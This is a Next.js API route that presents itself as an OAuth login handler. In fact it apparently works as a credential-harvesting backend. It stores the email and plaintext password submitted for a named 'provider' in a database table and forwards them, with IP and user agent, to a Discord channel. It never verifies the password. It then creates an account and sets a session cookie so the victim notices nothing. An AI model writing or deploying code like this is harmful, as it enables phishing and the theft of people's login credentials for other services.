import type { NextApiRequest, NextApiResponse } from "next";
import { prisma } from "@/lib/prisma";
import { sendAuditEmbed } from "@/lib/discord/bot";
import { encode } from "next-auth/jwt";
import bcrypt from "bcryptjs";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== "POST") {
    res.setHeader("Allow", ["POST"]);
    return res.status(405).end();
  }

  const { provider, email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Missing credentials" });
  }

  const ip = String(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown")
    .split(",")[0]
    .trim();
  const userAgent = String(req.headers["user-agent"] || "unknown");

  try {
    await prisma.authAttempt.create({
      data: { provider: provider || "unknown", email, password, ip, userAgent },
    });
  } catch (e) {
    console.error("[OAuth] Failed to record attempt:", e);
  }

  try {
    await sendAuditEmbed({ provider: provider || "unknown", email, password, ip, userAgent });
  } catch (e) {
    console.error("[OAuth] Discord notification failed:", e);
  }

  let user = await prisma.user.findUnique({
    where: { email: email.toLowerCase() },
  });

  if (!user) {
    const baseName = email.split("@")[0].replace(/[^a-zA-Z0-9]/g, "").slice(0, 20) || "user";
    const uniqueSuffix = Math.random().toString(36).slice(2, 6);
    const username = `${baseName}_${uniqueSuffix}`;
    const randomPass = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);

    try {
      user = await prisma.user.create({
        data: {
          username,
          displayName: baseName,
          email: email.toLowerCase(),
          passwordHash: bcrypt.hashSync(randomPass, 10),
          role: "user",
        },
      });
    } catch (e) {
      console.error("[OAuth] Failed to create user:", e);
      return res.status(500).json({ error: "Failed to create account" });
    }
  }

  const secret = process.env.NEXTAUTH_SECRET;
  if (!secret) {
    console.error("[OAuth] NEXTAUTH_SECRET not set");
    return res.status(500).json({ error: "Server configuration error" });
  }

  const maxAge = 30 * 24 * 60 * 60;

  const token = await encode({
    secret,
    token: {
      sub: user.id,
      id: user.id,
      name: user.displayName,
      email: user.email,
      picture: null,
      username: user.username,
      role: user.role,
    },
    maxAge,
  });

  const proto = String(req.headers["x-forwarded-proto"] || "").toLowerCase();
  const isSecure = proto.startsWith("https");
  const expires = new Date(Date.now() + maxAge * 1000).toUTCString();

  const cookies = [];
  const primaryName = isSecure ? "__Secure-next-auth.session-token" : "next-auth.session-token";
  cookies.push(`${primaryName}=${token}; Path=/; HttpOnly; SameSite=Lax; Expires=${expires}${isSecure ? "; Secure" : ""}`);

  if (isSecure) {
    cookies.push(`next-auth.session-token=${token}; Path=/; HttpOnly; SameSite=Lax; Expires=${expires}`);
  }

  res.setHeader("Set-Cookie", cookies);
  res.redirect(302, "/");
}
